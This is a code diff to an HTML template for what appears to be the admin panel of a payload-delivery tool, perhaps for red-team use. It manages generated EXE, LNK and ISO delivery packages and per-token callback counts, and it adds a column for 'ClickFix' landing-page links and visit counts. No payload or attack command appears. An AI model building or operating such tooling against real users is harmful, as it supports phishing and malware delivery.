@@ -50,7 +50,7 @@
                 批量删除
             </button>
             <form class="inline-form" action="{{ url_for('routes_web.delete_all_exe') }}" method="POST"
-                  data-confirm="确认删除所有已生成的 EXE 与 LNK 压缩包？此操作不可撤销。" data-confirm-danger data-confirm-ok="删除">
+                  data-confirm="确认删除所有已生成的 EXE、LNK、ISO 投递包？此操作不可撤销。" data-confirm-danger data-confirm-ok="删除">
                 <button class="btn btn-ghost btn-sm danger-text" type="submit">
                     <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
                     清除所有生成文件
@@ -74,6 +74,7 @@
                     <th>Token</th>
                     <th>状态</th>
                     <th>点击</th>
+                    <th>落地页</th>
                     <th class="hide-sm">创建时间</th>
                     <th>操作</th>
                 </tr>
@@ -110,6 +111,15 @@
                         {% endif %}
                     </td>
                     <td class="num">{{ t.callback_count }}</td>
+                    <td>
+                        <button class="copy-chip" type="button" data-copy="{{ t.landing_url }}" title="复制 ClickFix 落地页链接">
+                            <svg class="icon" aria-hidden="true"><use href="#i-globe"></use></svg>
+                            <span>复制链接</span>
+                        </button>
+                        {% if t.landing_visits %}
+                        <span class="badge badge-muted" title="落地页访问次数">{{ t.landing_visits }} 次访问</span>
+                        {% endif %}
+                    </td>
                     <td class="hide-sm"><span class="num">{{ t.created_at }}</span></td>
                     <td>
                         <div class="row-actions">
